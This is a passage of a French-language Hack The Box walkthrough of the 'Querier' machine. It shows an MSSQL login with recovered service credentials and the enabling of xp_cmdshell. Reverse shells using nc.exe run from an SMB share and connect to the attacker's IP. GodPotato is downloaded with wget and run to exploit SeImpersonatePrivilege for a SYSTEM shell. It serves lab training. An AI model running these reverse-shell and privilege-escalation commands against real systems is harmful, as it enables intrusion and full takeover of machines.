+</span></span><span class="line"><span class="cl">WINRM       10.129.181.104  <span class="m">5985</span>   QUERIER          <span class="o">[</span>-<span class="o">]</span> HTB.LOCAL<span class="se">\m</span>ssql-svc:corporate568
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  nxc mssql querier.htb.local -u <span class="s1">&#39;mssql-svc&#39;</span> -p <span class="s1">&#39;corporate568&#39;</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>-<span class="o">]</span> HTB.LOCAL<span class="se">\m</span>ssql-svc:corporate568 <span class="o">(</span>Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without <span class="s1">&#39;--local-auth&#39;</span><span class="o">)</span></span></span></code></pre></div></div>
+<p>Je me connecte avec <code>mssqlclient</code> avec les nouveaux identifiants <code>mssql-svc:corporate568</code>. Puis j&rsquo;active l&rsquo;exécution de code à distance avec la commande <code>enable_xp_cmdshell</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  mssqlclient.py <span class="s1">&#39;mssql-svc&#39;</span>:<span class="s1">&#39;corporate568&#39;</span>@<span class="s1">&#39;querier.htb.local&#39;</span> -windows-auth -db volume
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;volume&#39;</span>.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> 3232<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@volume<span class="o">)</span>&gt; xp_cmdshell whoami
+</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">&#39;sys.xp_cmdshell&#39;</span> of component <span class="s1">&#39;xp_cmdshell&#39;</span> because this component is turned off as part of the security configuration <span class="k">for</span> this server. A system administrator can <span class="nb">enable</span> the use of <span class="s1">&#39;xp_cmdshell&#39;</span> by using sp_configure. For more information about enabling <span class="s1">&#39;xp_cmdshell&#39;</span>, search <span class="k">for</span> <span class="s1">&#39;xp_cmdshell&#39;</span> in SQL Server Books Online.
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@volume<span class="o">)</span>&gt; enable_xp_cmdshell<span class="p">;</span>
+</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;show advanced options&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;xp_cmdshell&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@volume<span class="o">)</span>&gt; xp_cmdshell whoami
+</span></span><span class="line"><span class="cl">output
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">querier<span class="se">\m</span>ssql-svc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">NULL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@volume<span class="o">)</span>&gt;</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-mssql-svc">Shell en tant que mssql-svc</h2>
+<p>Je n&rsquo;ai pas réussi à avoir de shell avec des payloads reverse shell simple comme avec PowerShell. Du coup en regardant le writeup de <a href="https://0xdf.gitlab.io/2019/06/22/htb-querier.html#shell-as-mssql-svc" target="_blank" rel="noopener noreffer ">0xdf</a>, j&rsquo;ai découvert une nouvelle méthode à ajouter à mon arsenal.
+Sur un premier terminal je lancer un serveur SMB avec la commande suivante pointant vers un répertoire dans lequel j&rsquo;y ai mis <code>nc.exe</code>. Dans le second je lance mon listener.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">smbserver.py -smb2support share smb</span></span></code></pre></div></div>
+<p>Enfin sur le troisième je lance la commande suivante. Elle a pour but d&rsquo;accéder à mon partage et d&rsquo;exécuter le fichier <code>nc.exe</code> avec les arguments pour un reverse shell.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> xp_cmdshell \\10.10.14.89\share\nc.exe -e cmd.exe 10.10.14.89 1234</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Querier/Querier-3.png"
+        data-srcset="/images/Querier/Querier-3.png, /images/Querier/Querier-3.png 1.5x, /images/Querier/Querier-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Querier/Querier-3.png"
+        title="/images/Querier/Querier-3.png" width="1665" height="901" /></p>
+<h2 id="shell-en-tant-quadministrateur">Shell en tant qu&rsquo;administrateur</h2>
+<h3 id="seimpersonateprivilege">SeImpersonatePrivilege</h3>
+<p>En regardant les privilèges de <code>mssql-svc</code>, je vois qu&rsquo;il possède le privilège <code>SeImpersonatePrivilege</code> qui lui permet de se faire passer pour n&rsquo;importe quel utilisateur.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;whoami /priv
+</span></span><span class="line"><span class="cl">whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                               <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for</span> a process        Disabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>            Disabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;powershell
+</span></span><span class="line"><span class="cl">powershell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Windows PowerShell
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;</span></span></code></pre></div></div>
+<h3 id="godpotato">GodPotato</h3>
+<p>Cette attaque peut se faire avec un outils appelé <a href="https://github.com/BeichenDream/GodPotato" target="_blank" rel="noopener noreffer ">GodPotato</a> et <code>nc.exe</code>. Donc je telecharge sur la machine cible les deux exécutable puis je lance la commande me permettant d&rsquo;obtenir un reverse shell en tant que l&rsquo;utilisateur qui sera usurpé (normalement l&rsquo;administrateur).</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; mkdir temp
+</span></span><span class="line"><span class="cl">mkdir temp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name                                          
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----                                          
+</span></span><span class="line"><span class="cl">d-----        7/21/2025  12:35 AM                temp                                          
+</span></span><span class="line"><span class="cl">PS C:\&gt; cd temp
+</span></span><span class="line"><span class="cl">cd temp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:\temp&gt; wget http://10.10.14.89:8000/gp.exe -o gp.exe
+</span></span><span class="line"><span class="cl">wget http://10.10.14.89:8000/gp.exe -o gp.exe
+</span></span><span class="line"><span class="cl">PS C:\temp&gt; wget http://10.10.14.89:8000/nc.exe -o nc.exe
+</span></span><span class="line"><span class="cl">wget http://10.10.14.89:8000/nc.exe -o nc.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:\temp&gt; ./gp.exe -cmd &#34;C:\temp\nc.exe -e cmd.exe 10.10.14.89 4444&#34;                    
+</span></span><span class="line"><span class="cl">./gp.exe -cmd &#34;C:\temp\nc.exe -e cmd.exe 10.10.14.89 4444&#34;
+</span></span><span class="line"><span class="cl">[*] CombaseModule: 0x140712287731712
+</span></span><span class="line"><span class="cl">[*] DispatchTable: 0x140712290045136
+</span></span><span class="line"><span class="cl">[*] UseProtseqFunction: 0x140712289423456
+</span></span><span class="line"><span class="cl">[*] UseProtseqFunctionParamCount: 6
+</span></span><span class="line"><span class="cl">[*] HookRPC
+</span></span><span class="line"><span class="cl">[*] Start PipeServer
+</span></span><span class="line"><span class="cl">[*] CreateNamedPipe \\.\pipe\8410b743-89b2-4de4-a064-56176ea3b7ad\pipe\epmapper
+</span></span><span class="line"><span class="cl">[*] Trigger RPCSS
+</span></span><span class="line"><span class="cl">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+</span></span><span class="line"><span class="cl">[*] DCOM obj IPID: 00009802-1768-ffff-1f29-528bb8215136
+</span></span><span class="line"><span class="cl">[*] DCOM obj OXID: 0x65ef5b793eb619b6
+</span></span><span class="line"><span class="cl">[*] DCOM obj OID: 0xd15b4f95fa5a3953
+</span></span><span class="line"><span class="cl">[*] DCOM obj Flags: 0x281
+</span></span><span class="line"><span class="cl">[*] DCOM obj PublicRefs: 0x0
+</span></span><span class="line"><span class="cl">[*] Marshal Object bytes len: 100
+</span></span><span class="line"><span class="cl">[*] UnMarshal Object
+</span></span><span class="line"><span class="cl">[*] Pipe Connected!
+</span></span><span class="line"><span class="cl">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+</span></span><span class="line"><span class="cl">[*] CurrentsImpersonationLevel: Impersonation
+</span></span><span class="line"><span class="cl">[*] Start Search System Token
+</span></span><span class="line"><span class="cl">[*] PID : 840 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+</span></span><span class="line"><span class="cl">[*] Find System Token : True
+</span></span><span class="line"><span class="cl">[*] UnmarshalObject: 0x80070776
+</span></span><span class="line"><span class="cl">[*] CurrentUser: NT AUTHORITY\SYSTEM
+</span></span><span class="line"><span class="cl">[*] process start with pid 461</span></span></code></pre></div></div>
+<p>J&rsquo;obtiens alors un shell en tant qu&rsquo;administrateur du domaine.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  rlwrap nc -lvnp 4444
+</span></span><span class="line"><span class="cl">Ncat: Version 7.93 ( https://nmap.org/ncat )
+</span></span><span class="line"><span class="cl">Ncat: Listening on :::4444
+</span></span><span class="line"><span class="cl">Ncat: Listening on 0.0.0.0:4444
+</span></span><span class="line"><span class="cl">Ncat: Connection from 10.129.181.104.
+</span></span><span class="line"><span class="cl">Ncat: Connection from 10.129.181.104:49687.
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.292]
+</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\temp&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority\system
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\temp&gt;cd /users/administrator/desktop
+</span></span><span class="line"><span class="cl">cd /users/administrator/desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt;type root.txt
+</span></span><span class="line"><span class="cl">type root.txt
+</span></span><span class="line"><span class="cl">af13b2192b695be76962a6fb99103c62</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/querier/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/querier/" data-title="Querier" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,MSSQL"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/mssql/">MSSQL</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/reset/" class="prev" rel="prev" title="Reset"><i class="fas fa-angle-left" aria-hidden="true"></i>Reset</a>
+            <a href="/puppy/" class="next" rel="next" title="Puppy">Puppy<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
